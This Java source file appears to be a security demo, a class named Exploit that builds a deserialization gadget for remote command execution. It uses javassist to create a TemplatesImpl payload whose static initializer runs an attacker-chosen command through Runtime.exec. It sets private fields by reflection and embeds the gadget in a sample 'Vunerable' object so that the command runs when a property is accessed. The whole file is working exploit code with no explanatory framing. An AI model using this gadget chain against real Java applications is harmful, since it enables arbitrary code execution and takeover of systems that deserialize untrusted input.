package com.ttulka.security;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.ttulka.security.sample.Vunerable;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class Exploit implements Serializable {

    private static final long serialVersionUID = 1L;

    private final String cmd;

    public Exploit(String cmd) {
        this.cmd = cmd;
    }

    public Vunerable exploited(Vunerable vunerable) throws Exception {
        Object exploit = createTemplatesImpl(cmd);
        vunerable.setObject(exploit);
        setFieldValue(vunerable, "property", "outputProperties");
        return vunerable;
    }

    TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                     command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
                     "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("com.ttulka.StubTransletPayload" + System.nanoTime());
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
        return templates;
    }

    void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    public static class ClassFiles {

        public static String classAsFile(final Class<?> clazz) {
            return classAsFile(clazz, true);
        }

        public static String classAsFile(final Class<?> clazz, boolean suffix) {
            String str;
            if (clazz.getEnclosingClass() == null) {
                str = clazz.getName().replace(".", "/");
            } else {
                str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
            }
            if (suffix) {
                str += ".class";
            }
            return str;
        }

        public static byte[] classAsBytes(final Class<?> clazz) {
            try {
                final byte[] buffer = new byte[1024];
                final String file = classAsFile(clazz);
                final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
                if (in == null) {
                    throw new IOException("couldn't find '" + file + "'");
                }
                final ByteArrayOutputStream out = new ByteArrayOutputStream();
                int len;
                while ((len = in.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }
                return out.toByteArray();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

}
